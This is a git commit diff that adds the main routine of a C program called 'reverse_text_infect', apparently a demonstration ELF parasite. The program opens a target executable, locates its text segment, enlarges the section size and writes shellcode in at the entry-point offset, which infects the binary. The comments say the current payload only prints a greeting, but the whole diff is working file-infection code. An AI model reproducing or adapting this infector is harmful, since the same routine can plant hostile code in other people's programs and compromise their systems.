224208b98bbea86f31a808201872213003b0c3bb
2hYan9 <thefuture1snow@163.com>
2022-09-05 22:26:37 +0800

    update some files

--- code_parasite/reverse_text_infect.c
+++ code_parasite/reverse_text_infect.c
@@ -66,3 +66,74 @@ uint8_t *create_shellcode(void (*fn)(),size_t len)
 uint64_t f1 = (uint64_t)parasite_greeting;
 uint64_t f2 = (uint64_t)create_shellcode;
 
+int main(int argc, int *argv[])
+{
+    if(argc < 2)
+    {
+        printf("Usage: %s <exec_file>\n", argv[0]);
+        exit(-1);
+    }
+    size_t parasite_len = ((f2 - f1) + 7) & (~7);
+    uint8_t *shellcode = create_shellcode(parasite_greeting, parasite_len);
+    char *file_name = strdup(argv[1]);
+    int fd;
+    if((fd = open(file_name, O_RDWR)) < 0)
+    {
+        perror("open");
+        exit(-1);
+    }
+    struct stat st;
+    if(fstat(fd, &st) < 0)
+    {
+        perror("fstat");
+        exit(-1);
+    }
+    uint8_t *mem = mmap(NULL, st.st_size, PROT_READ|PROT_WRITE, MAP_PRIVATE, fd, 0);
+    if(mem == NULL)
+    {
+        perror("mmap");
+        exit(-1);
+    }
+    Elf64_Ehdr *ehdr = (Elf64_Ehdr *)mem;
+    Elf64_Phdr *phdr = (Elf64_Phdr *)&mem[ehdr->e_phoff];
+    Elf64_Shdr *shdr = (Elf64_Shdr *)&mem[ehdr->e_shoff];
+    Elf64_Off start_off;
+    Elf64_Off text_off;
+    Elf64_Addr new_origin_entry;
+    /* this is for jump back to the original entry*/
+    /* but here we just print a greeting message */
+    /* so this variable is unused */
+    
+    int i;
+    for(i = 0; i < ehdr->e_phnum; i++)
+    {
+        if(phdr[i].p_type == PT_LOAD && phdr[i].p_flags == PF_R + PF_X)
+        {
+            text_off = phdr[i].p_offset;
+            start_off = ehdr->e_entry - phdr[i].p_vaddr;
+            new_origin_entry = ehdr->e_entry + parasite_len;            
+        }
+    }
+    for(i = 0; i < ehdr->e_shnum; i++)
+    {
+        if(shdr[i].sh_offset == text_off)
+            shdr[i].sh_size += parasite_len;
+    }
+
+    if(lseek(fd, start_off, SEEK_SET) < 0)
+    {
+        perror("lseek");
+        exit(-1);
+    }
+    if(write(fd, shellcode, parasite_len) < 0)
+    {
+        perror("write");
+        exit(-1);
+    }
+    if(write(fd, &mem[start_off], st.st_size - start_off) < 0)
+    {
+        perror("write");
+        exit(-1);
+    }
+    close(fd);
+}
